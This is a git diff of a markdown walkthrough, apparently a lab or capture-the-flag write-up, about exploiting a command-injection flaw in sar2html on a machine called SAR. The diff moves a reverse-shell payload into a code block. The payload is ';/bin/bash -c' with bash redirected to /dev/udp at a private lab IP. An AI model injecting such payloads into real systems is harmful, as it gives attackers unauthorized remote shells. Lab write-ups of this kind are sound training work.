@@ -1,5 +1,3 @@
-https://www.exploit-db.com/exploits/47204
-;bash -c 'bash -i >& /dev/udp/192.168.66.191/4242 0>&1'
 # SAR
 
 ## Introduction
@@ -54,7 +52,10 @@ Sar2html is a tool that comes with most linux machines, and was found to be vuln
 <img src="assets/page.png">
 
 ### Reverse shell
-In order to work freely, I sent an http request with a reverse shell command: 
+In order to work freely, I sent an http request with a reverse shell command using a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">payload</a>: 
+```
+;/bin/bash -c 'bash -i >& /dev/udp/192.168.66.191/4242 0>&1'
+```
 <img src="assets/postman.png"><br>
 And used netcat to intercept the communication on my host machine
 <img src="assets/nc.png"><br>
